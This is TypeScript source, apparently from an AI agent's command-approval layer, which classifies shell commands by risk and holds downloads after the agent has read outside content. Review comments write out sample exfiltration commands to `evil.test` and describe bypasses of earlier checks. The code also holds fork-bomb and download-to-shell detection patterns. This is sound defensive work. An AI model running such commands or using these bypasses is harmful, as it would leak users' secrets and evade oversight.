  if (name === 'curl' || name === 'wget' || name === 'http' || name === 'https' || name === 'httpie' || name === 'xh') {
    if (anyFlag(/^-(?:[A-Za-z]*[dFT][A-Za-z]*)$|^--(?:data|data-binary|data-raw|data-urlencode|form|form-string|upload-file|json|post-data|post-file|body-data|body-file|method)(?:=|$)/) || words.some((word, at) => (word === '-X' || word === '--request') && /^(?:POST|PUT|PATCH|DELETE)$/i.test(words[at + 1] ?? '')) || /^-X(?:POST|PUT|PATCH|DELETE)$/i.test(words.find((word) => /^-X./.test(word)) ?? '')) return risky(`${name} sends data off this machine`);
    if (name === 'http' || name === 'https' || name === 'xh') return risky(`${name} can send data off this machine`);
    // 0.4.18: a download is safe when it is a PLAIN one: one http(s) URL and only flags known to send nothing (src/domain/plainDownload.ts). The rule
    // fails closed, so a flag curl adds later, or one nobody thought of, asks instead of slipping through. Anything that carries data is risky above.
    const download = plainDownload(args.map((arg) => arg.text), name);
    if (download.plain) {
      // 0.4.18 review: a write target is judged like any other write. `curl -o ~/.bashrc https://evil.test` would otherwise put attacker bytes into a
      // file the shell reads next, with no approval. The workspace and the scratch folder are places the run may already write; anywhere else asks.
      if (download.output !== undefined) {
        const target = pathFacts(download.output, state.cwd, context);
        if (!target.inside && !scratchFacts(download.output, target.absolute, target.sensitive, context)) {
          return unknown(`${name} downloads a file to ${download.output}, which is outside the project`);
        }
      }
      return safe(`${name} downloads a page and sends nothing of this run's with it`);
    }
    // 0.4.18 review: say why, rather than falling through to "not a command the rules know", which would be a wrong explanation for `curl --netrc`.
    return unknown(`${name} ${download.reason ?? 'is not a plain download'}`);
  }
  if (name === 'rsync') return words.some((word) => !looksLikeOption(word) && /^[^/]*:|^[\w.-]+@/.test(word)) ? risky('rsync copies to or from another machine') : unknown('rsync copies files');
  if (name === 'crontab') return words.length === 1 && words[0] === '-l' ? unknown('crontab -l') : risky('crontab changes scheduled jobs');
  if (name === 'systemctl' || name === 'service' || name === 'launchctl') return words.some((word) => /^(?:start|stop|restart|reload|enable|disable|mask|unmask|kill|load|unload|bootstrap|bootout|daemon-reload)$/.test(word)) ? risky(`${name} changes system services`) : unknown(`${name}`);
  if (name === 'docker' || name === 'podman') {
    // A push publishes an image; login and logout change your credentials and publish nothing (D-46).
    const pushes = words[0] === 'push' || (words[0] === 'image' && words[1] === 'push');
    if (['push', 'login', 'logout'].includes(words[0] ?? '') || (words[0] === 'image' && words[1] === 'push')) return risky(`${name} ${words[0]} changes a registry or your credentials`, pushes ? publishTo('container-registry') : undefined);
    return unknown(`${name} ${words[0] ?? ''}`.trim());
  }
  if (name === 'kubectl' || name === 'helm' || name === 'oc') return /^(?:apply|create|delete|replace|patch|rollout|scale|set|edit|exec|cp|drain|cordon|taint|label|annotate|install|upgrade|uninstall|rollback)$/.test(words.find((word) => !looksLikeOption(word)) ?? '') ? risky(`${name} changes a cluster`, publishTo('deploy')) : unknown(name);
  if (name === 'terraform' || name === 'tofu' || name === 'pulumi' || name === 'cdk' || name === 'serverless' || name === 'sls') return /^(?:apply|destroy|import|up|deploy|remove|refresh|taint|untaint|state)$/.test(words.find((word) => !looksLikeOption(word)) ?? '') ? risky(`${name} changes deployed infrastructure`, publishTo('deploy')) : unknown(name);
/**
 * GitHub's read-only subcommands (0.4.18 review). A run waiting for CI polls `gh pr checks` and `gh pr view`, so those must not be a question every
 * time; nothing here writes. A flag that names another repository or a JSON field still only reads, and `gh api` keeps its own rule.
 */
const READ_ONLY_GH = new Set([
  'pr view', 'pr list', 'pr checks', 'pr diff', 'pr status',
  'run list', 'run view', 'run watch', 'release list', 'release view',
  'repo view', 'issue view', 'issue list', 'workflow list', 'workflow view'
  // `search prs` and `search issues` are deliberately NOT here: the query is sent to GitHub and is not required to be literal, so
  // `gh search issues "$TOKEN"` would send a secret off the machine. 0.4.19 review.
]);

  if (name === 'gh' || name === 'glab') {
    const [group, action] = words.filter((word) => !looksLikeOption(word));
    // Only release creation and its changes are publishing on the floor; other GitHub writes stay with the settings layer (D-46, an owner question).
    const onReleases = words.some((word) => !looksLikeOption(word) && /(?:^|\/)releases(?:[/?]|$)/.test(word));
    if (group === 'api') return words.some((word, at) => (word === '-X' || word === '--method') && !/^GET$/i.test(words[at + 1] ?? '')) || anyFlag(/^-(?:f|F)$|^--(?:field|raw-field|input)(?:=|$)/) ? risky(`${name} api changes data on GitHub`, onReleases ? publishTo('release') : undefined) : unknown(`${name} api`);
    const releases = group === 'release' && /^(?:create|upload|edit|delete|delete-asset)$/.test(action ?? '');
    if (/^(?:create|edit|delete|merge|close|reopen|comment|review|upload|ready|lock|unlock|transfer|archive|rename|fork|sync|set|add|remove|enable|disable|run|cancel|rerun|login|logout|setup-git|refresh)$/.test(action ?? '') || group === 'release' && action !== 'list' && action !== 'view') return risky(`${name} ${group} ${action} changes data on GitHub`, releases ? publishTo('release') : undefined);
    // 0.4.18 review: a run waiting for CI polls with exactly these, and the waiting guidance tells it to. Leaving them unknown would make every poll a
    // question in an asking mode, which is the wait the Check now button exists to end. They only read: no verb here writes to GitHub.
    if (name === 'gh' && READ_ONLY_GH.has(`${group ?? ''} ${action ?? ''}`.trim())) return safe(`${name} reads from GitHub and changes nothing`);
    return unknown(`${name} ${group ?? ''} contacts GitHub`.trim());
  }
  if (['vsce', 'ovsx', 'twine', 'gem', 'vercel', 'netlify', 'firebase', 'wrangler', 'fly', 'flyctl', 'heroku', 'semantic-release', 'release-it', 'np', 'gh-pages'].includes(name)) {
    const sub = words.find((word) => !looksLikeOption(word)) ?? '';
    if (['vsce', 'ovsx'].includes(name) && !['publish', 'unpublish'].includes(sub)) return unknown(`${name} ${sub}`.trim());
    if (name === 'gem' && sub !== 'push' && sub !== 'yank') return unknown(`gem ${sub}`.trim());
    return risky(`${name} ${sub} publishes, releases, or deploys`.replace(/\s+/g, ' '), publishTo(PUBLISH_TOOL_TARGETS[name] ?? 'release'));
  }
  if (name === 'cargo') {
    const sub = words.find((word) => !looksLikeOption(word)) ?? '';
    if (['publish', 'yank', 'owner', 'login', 'logout'].includes(sub)) return risky(`cargo ${sub} changes crates.io`, publishTo('registry'));
    if (['build', 'test', 'check', 'clippy', 'fmt', 'bench', 'doc', 'tree', 'metadata'].includes(sub) && !words.some((word) => /^--(?:manifest-path|target-dir|config|out-dir)(?:=|$)|^-Z$/.test(word))) return safe(`cargo ${sub} builds or tests the project`);
    return unknown(`cargo ${sub}`.trim());
  }
  if (name === 'go') {
    const sub = words[0] ?? '';
    if (['test', 'build', 'vet', 'fmt', 'list', 'version', 'env'].includes(sub) && sub !== 'env' && !words.some((word) => /^-(?:o|exec|toolexec|modfile|overlay)(?:=|$)/.test(word))) { const reads = checkReads(args.slice(1).filter((arg) => !arg.text.startsWith('./...') && arg.text !== '...'), state, context, `go ${sub}`); return reads.verdict === 'safe' ? safe(`go ${sub} builds or tests the project`) : reads; }
    return unknown(`go ${sub}`.trim());
  }
  if (name === 'make' || name === 'gmake') {
    if (words.some((word) => /^-(?:C|f|I|-directory|-file|-makefile|-include-dir)(?:=|$)|^-[A-Za-z]*[CfI]$/.test(word))) return unknown('make with -C or -f runs another makefile');
    const target = words.find((word) => RELEASE_NAME.test(word) || /^(?:install|uninstall|clean|distclean)$/.test(word));
    if (target) return RELEASE_NAME.test(target) ? risky(`make ${target} looks like a publish, release, or deploy target`, publishTo('release')) : unknown(`make ${target} may change files outside the workspace`);
    if (words.some((word) => word.includes('='))) return unknown('make with variable overrides');
    return safe('make builds the project');
  }
  if (name === 'npm' || name === 'pnpm' || name === 'yarn' || name === 'bun') return program !== name ? unknown(`${program} is not the usual ${name}`) : classifyPackageManager(name, args, state, context, depth);
  if (name === 'npx' || (name === 'pnpm' && words[0] === 'dlx')) return classifyNpx(args, state, context, depth);
  if (name === 'git') return program !== 'git' ? unknown(`${program} is not the usual git`) : classifyGit(args, state, context);
  if (name === 'near') return words.some((word) => /delete|deploy|send|transfer|sign|add-key|create-account|stake|call-function|as-transaction|tokens|import-account|export-account|login/i.test(word)) ? risky('near can sign transactions or change keys on NEAR', publishTo('chain')) : unknown('near contacts the NEAR network');
  if (name === 'aws' || name === 'gcloud' || name === 'az' || name === 'gsutil') return /^(?:cp|sync|mv|rm|rb|mb|put-object|delete|deploy|create|update|upload)/.test(words.slice(1).find((word) => !looksLikeOption(word)) ?? '') || words.some((word) => /^(?:deploy|delete|rm|cp|sync)$/.test(word)) ? risky(`${name} changes or uploads to cloud resources`, publishTo('deploy')) : unknown(name);
  if (name === 'xargs') {
    const inner = xargsCommand(args);
    if (DELETERS.has(programName(inner[0]?.text ?? ''))) {
      classifyWords(inner, state, context, depth + 1); // what it names itself (a protected file) is tagged too
      return risky(`xargs ${inner[0].text} deletes every file it is given`, DESTROY_ALL);
    }
    const result = classifyWords(inner, state, context, depth + 1);
    return result.verdict === 'risky' ? risky(`xargs runs a risky command: ${result.reason}`) : unknown('xargs runs a command for every input line');
  }
  if (name === 'ln') return unknown('ln creates links, which can point outside the workspace');
  if (name === 'export' || name === 'unset' || name === 'alias' || name === 'set' || name === 'shopt' || name === 'ulimit' || name === 'umask') return unknown(`${name} changes the shell session for later commands`);
  if (INTERPRETERS.has(name)) {
    noteInlineScript(name, args, state, context, depth);
    if ((name === 'python' || name === 'python3') && words[0] === '-m' && ['pytest', 'unittest', 'mypy', 'ruff', 'black', 'flake8', 'pylint', 'isort'].includes(words[1] ?? '')) {
      const reads = checkReads(args.slice(2), state, context, `python -m ${words[1]}`);
      return reads.verdict === 'safe' ? safe(`python -m ${words[1]} tests or checks the project`) : reads;
    }
    // 0.4.18: running a helper script that sits in a scratch folder is accepted, the same way Open-GSD's workflows run /tmp scripts. The script itself
    // must be a scratch path (absolute, in a temporary folder, no `..`), which the path fact already decides; anything else an interpreter runs still
    // asks, because the rules cannot see what it does.
    const firstArg = args.find((word) => !word.text.startsWith('-'));
    if (firstArg && !firstArg.expansion && !firstArg.glob) {
      const scriptFacts = pathFacts(firstArg.text, state.cwd, context);
      // 0.4.18: a look-alike gsd-tools is not scratch. Running one from a temporary folder must still ask, so the scratch acceptance cannot be used
      // to reach a copy of Open-GSD's tool that NEAR AI did not install.
      const looksLikeGsdTools = /(?:^|\/)gsd-tools(?:\.cjs)?$/.test(firstArg.text);
      // 0.4.18 review: a temporary folder is writable by anything, so a page the run read could drop a script there and have it run. Only a script the
      // run itself wrote is code the run may execute without asking; any other scratch script asks.
      const wrote = (context.writtenScratch ?? []).some((file) => path.resolve(file) === path.resolve(scriptFacts.absolute));
      if (scriptFacts.scratch && wrote && !looksLikeGsdTools) {
        const reads = checkReads(args.slice(args.indexOf(firstArg) + 1), state, context, `${name} on a scratch script`);
        return reads.verdict === 'safe' ? safe(`${name} runs a helper script in a temporary folder`) : reads;
      }
    }
    if (name === 'node') {
      if (words.length === 1 && (words[0] === '--version' || words[0] === '-v')) return safe('node --version');
      if (isTrustedGsdTool(args[0], state, context) && programName(args[0].text) === 'gsd-tools.cjs') return classifyGsdTools(args.slice(1), state, context);
      if (words[0] === '--test' && !words.some((word) => /^--(?:import|require|loader|experimental-loader|eval|print)(?:=|$)|^-[erp]$/.test(word))) {
        const reads = checkReads(args.slice(1), state, context, 'node --test');
        return reads.verdict === 'safe' ? safe('node --test runs the project\'s tests') : reads;
      }
    }
    return unknown(`${name} runs code the rules cannot check`);
  }
  if ((name === 'sed' || name === 'gsed') && program === name) return classifySed(args, state, context);
  if ((name === 'awk' || name === 'gawk' || name === 'mawk') && program === name) return classifyAwk(args, state, context);
  if (DEV_TOOLS.has(name) && (viaNpx || program === name || isLocalBin(program, state, context))) {
    if (name === 'tsx') return unknown('tsx runs a script');
    const outputs = words.some((word) => /^--(?:outDir|outFile|out-file|output-file|o|declarationDir|rootDir|tsBuildInfoFile|cache-location|config|resolve-plugins-relative-to|rulesdir|plugin|require|c)(?:=|$)|^-[oc]$/.test(word));
    const reads = checkReads(args, state, context, name);
    if (reads.verdict !== 'safe') return reads;
    return outputs ? unknown(`${name} with an output, config, or plugin option`) : safe(`${name} builds, tests, or checks the project`);
  }
  if (READ_ONLY.has(name) && program === name) {
    if ((name === 'sort' && anyFlag(/^-o|^--output/)) || (name === 'printf' && words.includes('-v')) || (name === 'rg' && anyFlag(/^--pre(?:=|$)|^--pre-glob/))) return unknown(`${name} with an option that writes or runs programs`);
    if (name === 'tail' && anyFlag(/^-[A-Za-z]*f/)) return unknown('tail -f does not finish');
    return checkReads(args, state, context, name, true);
  }
  if (WORKSPACE_WRITERS.has(name) && program === name) {
    if (name === 'cp' || name === 'mv') {
      // Every operand is checked as a write; sources outside the workspace are not `safe` either.
      const operands = args.filter((arg) => !looksLikeOption(arg.text));
      const writes = checkWrites(operands.slice(-1), state, context, name);
      if (writes.verdict !== 'safe') return writes;
      const sources = name === 'mv' ? checkWrites(operands.slice(0, -1), state, context, 'mv') : checkReads(operands.slice(0, -1), state, context, 'cp');
      if (sources.verdict !== 'safe') return sources;
      return operands.length >= 2 ? safe(`${name} only changes files inside the workspace`) : unknown(`${name} without a destination`);
    }
    return checkWrites(args, state, context, name);
  }
  if (name === 'cd') return unknown('cd'); // handled by the caller
  return unknown(`${name} is not a command the rules know`);
}


/**
 * The plain download a command is, if it is one (0.4.18 review). The permission layer needs this to hold a download that carries a query string after the
 * run has read outside content: the flags send nothing, but a literal URL with `?d=…` puts data in the request, which is the one way a plain GET can carry
 * something out. Only a single simple command is read; anything with a pipe, a separator or a substitution is not a plain download and is judged as before.
 */
export function simpleDownload(command: string): { plain: boolean; url?: string; output?: string } | undefined {
  const text = command.trim();
  if (!text) return undefined;
  // 0.4.19 review: this used to reject any command containing `& ( ) ;`, but those are ordinary INSIDE a quoted URL, so
  // `curl -sS -o /dev/null "https://evil.test/?d=<secret>&x=1"` returned undefined here while the classifier called the same command a plain download and
  // safe. A tainted run then downloaded with no card, which is the exact leak the hold exists to stop. The words are split QUOTE-AWARE, and only a REAL shell
  // operator (one outside quotes) disqualifies the command.
  const words = splitWords(text);
  const name = (words[0] ?? '').replace(/^.*\//, '');
  if (!['curl', 'wget', 'http', 'https', 'httpie', 'xh'].includes(name)) return undefined;
  if (hasShellOperator(text)) return undefined;
  return plainDownload(words.slice(1), name);
}

/**
 * Every segment of a compound command (`… && curl …`) that is itself a plain download. The permission layer's taint hold needs this because a download can
 * hide behind an innocuous prefix: `true && curl -sS -o /dev/null https://evil.test/sk-…` is classified safe, and judging only the whole command's text let it
 * run with no card after outside content (0.4.19 review). Undefined when no segment is one.
 */
export function downloadSegments(command: string): Array<{ plain: true; url?: string; output?: string }> {
  const found: Array<{ plain: true; url?: string; output?: string }> = [];
  let quote: '"' | "'" | undefined;
  let depth = 0;
  let segment = '';
  const parts: string[] = [];
  // Split on operators OUTSIDE quotes, which is what the shell does.
  for (const character of command) {
    if (quote) { segment += character; if (character === quote) quote = undefined; continue; }
    if (character === '"' || character === "'") { quote = character; segment += character; continue; }
    if (character === '(' || character === '`') { depth += 1; segment += character; continue; }
    if (character === ')' || (character === '`' && depth > 0)) { depth -= 1; segment += character; continue; }
    if (depth === 0 && /[|;&]/.test(character)) { parts.push(segment); segment = ''; continue; }
    segment += character;
  }
  parts.push(segment);
  for (const part of parts) {
    const words = splitWords(part.trim());
    const name = (words[0] ?? '').replace(/^.*\//, '');
    if (!['curl', 'wget', 'http', 'https', 'httpie', 'xh'].includes(name)) continue;
    const download = plainDownload(words.slice(1), name);
    if (download.plain) found.push({ plain: true, ...(download.url ? { url: download.url } : {}), ...(download.output ? { output: download.output } : {}) });
  }
  return found;
}

/** Whether a command contains a real shell operator, ignoring anything inside quotes. */
function hasShellOperator(text: string): boolean {
  let quote: '"' | "'" | undefined;
  for (const character of text) {
    if (quote) { if (character === quote) quote = undefined; continue; }
    if (character === '"' || character === "'") { quote = character; continue; }
    if (/[|;&<>()`\n]/.test(character)) return true;
  }
  return false;
}

/** A command's words, with a quoted run kept as one word, which is how the shell reads them. */
function splitWords(text: string): string[] {
  const words: string[] = [];
  let word = '';
  let quote: '"' | "'" | undefined;
  for (const character of text) {
    if (quote) { word += character; if (character === quote) quote = undefined; continue; }
    if (character === '"' || character === "'") { quote = character; word += character; continue; }
    if (/\s/.test(character)) { if (word) { words.push(word); word = ''; } continue; }
    word += character;
  }
  if (word) words.push(word);
  return words;
}

function classifyText(command: string, context: CommandContext, depth: number): CommandClassification {
  const raw = command.trim();
  const deep = tooDeep(depth);
  if (deep) return deep;
  if (!raw) return unknown('the command is empty');
  // These two decide the verdict on their own, but the rest of the command is still read, so what it publishes or destroys is seen (Pitfall 2).
  const early = /:\(\)\s*\{/.test(raw) ? risky('it defines a fork bomb') : DOWNLOAD_TO_SHELL.test(raw) ? risky('it runs code downloaded from the network') : undefined;
  const result = classifyStructure(raw, context, depth);
  return early ?? result;
}

/**
 * The verdict of a command line once the two whole-text checks have passed. The first verdict any part decides is the one returned, as it always was; the
 * parts after it are still read, only so that every effect in the line is gathered.
 */
function classifyStructure(raw: string, context: CommandContext, depth: number): CommandClassification {
  // 0.4.18: Open-GSD also writes its prologue inline (cd to the project, export CLAUDE_CONFIG_DIR, GSD=<the managed gsd-tools>, then run it), which is
  // not the shipped block. When the runtime is verified trusted, its variables name known files, so the command is not opaque. This runs before the
  // preamble match so both forms reach the same checker.
  // The command's own CLAUDE_CONFIG_DIR must name the managed home: a look-alike runtime elsewhere must not borrow the trusted verdict.
  //
  // 0.4.18 review: the prologue is only acceptable in ONE shape. Every assignment must give the value the managed runtime has, and there may be exactly
  // two of them (CLAUDE_CONFIG_DIR then GSD), so a later reassignment cannot be deleted along with the substitution and quietly trusted. A command that
  // sets either variable to anything else, or sets them again, is judged without this allowance.
  const preamble = depth === 0 ? (context.gsdPreambles ?? []).find((text) => raw.startsWith(text)) : undefined;
  if (preamble) {
    // What follows must be a new command: nothing, or a newline, `;`, or `&&` and then the call.
    const rest = raw.slice(preamble.length);
    const joined = /^[ \t]*(?:(?:\r?\n|;|&&)\s*)?/.exec(rest)?.[0] ?? '';
    if (!rest.trim() || joined.trim() || /[\r\n]/.test(joined)) {
      const remainder = rest.slice(joined.length).trim();
      // What follows the preamble is read for its effects even when the runtime was not checked: gsd_run is then read as the managed gsd-tools.
      const inner = remainder ? classifyText(remainder, { ...context, gsdRunDefined: true }, depth + 1) : undefined;
      if (!context.gsdRun?.trusted) return unknown(`it starts with the Open-GSD preamble, but ${context.gsdRun?.reason ?? 'the shell it would run in was not checked'}`);
      if (!inner) return safe('it only runs the Open-GSD preamble, which picks the managed runtime\'s gsd-tools');
      return inner.verdict === 'safe' ? safe(`the Open-GSD preamble picks the managed runtime's gsd-tools, and ${inner.reason}`) : inner;
    }
  }
  const assigned = substitutionAssignment(raw);
  if (assigned !== undefined) {
    const inner = classifyText(assigned.inner, context, depth + 1);
    if (inner.verdict === 'safe') return safe(`it stores the output of a safe command in ${assigned.name} (${inner.reason})`);
    if (inner.verdict === 'risky') return risky(`a command inside a substitution is risky: ${inner.reason}`);
  }
  const lexed = lex(raw);
  if (lexed.segments.reduce((total, segment) => total + segment.words.length, 0) > MAX_COMMAND_WORDS) return beyondReach('the command has too many words to check');
  if (lexed.broken) {
    if (SENSITIVE_TEXT.test(raw)) return risky('it names a credential or knowledge-base path');
    return unknown(`it has ${lexed.broken}`);
  }
  const findings: CommandClassification[] = [];
  let decided: CommandClassification | undefined;
  for (const inner of lexed.substitutions) {
    const result = classifyText(inner, context, depth + 1);
    if (result.verdict === 'risky') decided ??= risky(`a command inside a substitution is risky: ${result.reason}`);
  }
  const state: SegmentState = { cwd: context.cwd ?? context.root };
  if (!isInside(context.root, state.cwd)) findings.push(unknown('the shell\'s working directory is outside the workspace'));
  for (const [at, segment] of lexed.segments.entries()) {
    // Pipes into an interpreter run whatever came down the pipe.
    const program = segment.words.find((word) => !/^[A-Za-z_][A-Za-z0-9_]*=/.test(word.text));
    const name = program ? programName(program.text) : '';
    noteRedirectWrites(segment.redirects, state, context);
    if ((segment.previous === '|' || segment.previous === '|&') && (INTERPRETERS.has(name) || (name === 'sudo' && segment.words.some((word) => INTERPRETERS.has(programName(word.text)))))) {
      const source = lexed.segments[at - 1];
      if (name === 'xargs') {
        // Skip xargs' own options; what follows is the command it runs for every line.
        const innerWords = xargsCommand(segment.words.slice(segment.words.indexOf(program!) + 1));
        if (DELETERS.has(programName(innerWords[0]?.text ?? ''))) {
          decided ??= risky(`xargs ${innerWords[0].text} deletes whatever comes down the pipe`, DESTROY_ALL);
          classifyWords(innerWords, state, context, depth + 1); // what it names itself (a protected file) is tagged too
          continue;
        }
        const inner = classifyWords(innerWords, state, context, depth + 1);
        if (inner.verdict === 'risky') { decided ??= risky(`xargs runs a risky command for every input line: ${inner.reason}`); continue; }
        findings.push(unknown('xargs runs a command for every input line'));
        continue;
      }
      decided ??= risky(`it pipes ${source?.words[0]?.text ?? 'output'} into ${name}, which runs it as code`);
      // Its own words (`bash -c '…'`, `sudo …`) are still read for what they do.
      classifyWords(segment.words, state, context, depth);
      continue;
    }
    for (const redirect of segment.redirects) {
      if (redirect.op.endsWith('&') && redirect.target && /^[0-9-]+$/.test(redirect.target.text)) continue;
      const target = redirect.target;
      if (!target) { decided ??= unknown('a redirect has no target'); continue; }
      if (redirect.op === '<<' || redirect.op === '<<<') continue;
      if (target.expansion || target.glob) { findings.push(unknown('a redirect target is decided at run time')); continue; }
      const facts = pathFacts(target.text, state.cwd, context);
      const writes = redirect.op !== '<';
      if (facts.sensitive) { decided ??= risky(`it ${writes ? 'writes' : 'reads'} ${target.text}, which may hold credentials or knowledge-base keys`); continue; }
      if (facts.device) continue;
      if (writes && !facts.inside && !facts.scratch) { decided ??= risky(`it writes ${target.text}, which is outside the workspace`); continue; }
      if (writes && facts.protectedWrite) { decided ??= risky(`it writes ${target.text}, inside .git, .planning/.near-ai or .near-ai (other than its scratch and attachments folders), where writes always ask`); continue; }
      // A read of a temporary folder is scratch work: safe, and named as such in the reason (0.4.18).
      if (!writes && !facts.inside && !facts.scratch) findings.push(unknown(`it reads ${target.text}, outside the workspace`));
    }
    if (!segment.words.length) continue;
    if (segment.words.some((word) => !word.quoted && word.text.startsWith('~') && word.text !== '~' && !word.text.startsWith('~/'))) findings.push(unknown('it names another user\'s home directory'));
    // Any word naming a credential or knowledge-base path, whatever the command.
    const secret = segment.words.find((word) => { const value = valuePart(word.text); return (value.includes('/') || value.startsWith('.') || value.startsWith('~') || /\.(?:kbkey|pem|key|p12|pfx|keystore)$|^state\.vscdb|^id_/.test(value)) && pathFacts(value, state.cwd, context).sensitive; });
    if (secret) decided ??= risky(`it names ${secret.text}, which may hold credentials or knowledge-base keys`);
    if (program && programName(program.text) === 'cd' && segment.words.indexOf(program) === 0) {
      const target = segment.words[1];
      if (!target) { findings.push(unknown('cd with no directory goes to the home directory, outside the workspace')); state.cwd = context.home ?? '/'; continue; }
      if (target.expansion || target.glob || target.text === '-' || segment.words.length > 2) { findings.push(unknown('cd to a directory decided at run time')); continue; }
      // Owner decision 2026-11-05 (0.4.17): a cd inside the workspace is part of ordinary work, so it is safe and does not make the whole
      // command unknown; a cd that leaves the workspace still asks.
      const facts = pathFacts(target.text, state.cwd, context);
      // A cd into the system's temporary folder is accepted scratch work (0.4.18): Open-GSD's workflows run helper scripts from /tmp.
      if (!facts.inside && !facts.scratch) findings.push(unknown(`cd ${target.text} leaves the workspace`));
      state.cwd = facts.absolute;
      continue;
    }
    // A part the user put on their allow list runs as is (the deny list is checked before this).
    const plain = segment.words.every((word) => !word.expansion && !word.glob && (!word.quoted || /^[\w.\/:=@+,%-]+$/.test(word.text)));
    if (plain && context.isAllowListed?.(segment.words.map((word) => word.text).join(' '))) {
      findings.push(safe(`${segment.words.slice(0, 2).map((word) => word.text).join(' ')} is on your allow list`));
      // The allow list decides the verdict, never what the floor sees: the part is still read for its effects.
      classifyWords(segment.words, state, context, depth);
      continue;
    }
    const result = classifyWords(segment.words, state, context, depth);
    if (result.verdict === 'risky') { decided ??= result; continue; }
    const wild = segment.words.find((word) => word.glob && !isWorkspaceGlob(word, state, context));
    if (wild) findings.push(unknown(`it uses a wildcard (${wild.text}) that may match files outside the workspace`));
    findings.push(result);
  }
  if (decided) return decided;
  if (SENSITIVE_TEXT.test(raw)) return risky('it names a credential or knowledge-base path');
  if (lexed.opaque) return unknown(lexed.opaque);
  const notSafe = findings.find((finding) => finding.verdict !== 'safe');
  if (notSafe) return notSafe;
  if (!findings.length) return unknown('it runs nothing the rules recognise');
  return findings.length === 1 ? findings[0] : safe(`every part is safe (${findings.map((finding) => finding.reason).join('; ')})`);
}

/**
 * `NAME=$(command)` or `NAME="$(command)"` and nothing else: the variable holds the command's
 * output and nothing runs besides the command, so the whole is as safe as the command is.
 */
function substitutionAssignment(raw: string): { name: string; inner: string } | undefined {
  const match = /^([A-Za-z_][A-Za-z0-9_]*)=("?)\$\(/.exec(raw);
  if (!match || raw[match[0].length] === '(') return undefined;
  const close = matchParen(raw, match[0].length);
  if (close < 0) return undefined;
  const rest = raw.slice(close + 1);
  if (rest !== match[2]) return undefined;
  return { name: match[1], inner: raw.slice(match[0].length, close) };
}

/**
 * Classifies a shell command for the `auto` approval mode. `safe` runs without asking, `risky`
 * asks (with `reason` on the approval card), and `unknown` goes to the safety model. It is pure:
 * it reads no files and runs nothing.
 */
export function classifyCommand(command: string, context: CommandContext): CommandClassification {
  // Too long to read at all: nothing is read, so nothing is known about what it does.
  if (command.length > MAX_COMMAND_LENGTH) {
    const reason = 'the command is too long to check';
    return { verdict: 'unknown', reason, effectsUnknown: reason };
  }
  const frame: EffectFrame = { effects: [] };
  effectFrames.push(frame);
  let result: CommandClassification;
  try {
    result = classifyText(command, context, 0);
  } finally {
    effectFrames.pop();
  }
  const effects = distinctEffects([...(result.effects ?? []), ...frame.effects]);
  const { effects: _own, effectsUnknown: _unknown, ...plain } = result;
  // A command the classifier did not read whole is never safe, wherever it stopped (a script that runs scripts past the bound, say): what it did not read
  // could be anything.
  const verdict = frame.unknown !== undefined && plain.verdict === 'safe' ? { verdict: 'unknown' as const, reason: frame.unknown } : plain;
  return { ...verdict, ...(effects.length > 0 ? { effects } : {}), ...(frame.unknown === undefined ? {} : { effectsUnknown: frame.unknown }) };
}
